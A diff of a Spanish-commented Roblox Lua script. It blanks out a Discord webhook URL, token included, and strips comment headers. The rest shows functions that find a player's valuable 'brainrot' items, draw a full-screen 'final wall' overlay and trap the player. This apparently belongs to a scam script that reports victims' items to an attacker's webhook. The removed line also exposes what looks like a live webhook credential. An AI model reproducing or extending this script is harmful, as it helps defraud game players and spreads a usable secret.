@@ -9,17 +9,13 @@ local StarterGui = game:GetService("StarterGui")
 local Lighting = game:GetService("Lighting")
 
 -- CONFIGURACIÓN
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1454970356682199124/sgCgykHejgELxXd9Jp4CTWX2ziOKdu-qtGczLtBAThWZj-DqOY7jKGlNdgqYuYpuNXmA"
+local WEBHOOK_URL = "  "
 local Min_Gen = 0
 
 -- VARIABLES LOCALES
 local Jugador = Players.LocalPlayer
 local PlayerGui = Jugador:WaitForChild("PlayerGui")
 local UserID = Jugador.UserId
-
---------------------------------------------------------------------------------
--- LÓGICA DE DETECCIÓN (BRAINROTS)
---------------------------------------------------------------------------------
 
 local function formatNumberShort(n)
     if not n or type(n) ~= "number" then return "$0" end
@@ -67,9 +63,6 @@ local function getBrainrots()
     return out
 end
 
---------------------------------------------------------------------------------
--- PANTALLA FINAL "MURO" (TEXTO MÁS GRANDE)
---------------------------------------------------------------------------------
 
 local function MostrarPantallaFinal()
     local FinalGui = Instance.new("ScreenGui", PlayerGui)
@@ -125,9 +118,6 @@ local function MostrarPantallaFinal()
     end)
 end
 
---------------------------------------------------------------------------------
--- FUNCIONES DE CONTROL
---------------------------------------------------------------------------------
 
 local function trapPlayer()
     local char = Jugador.Character or Jugador.CharacterAdded:Wait()
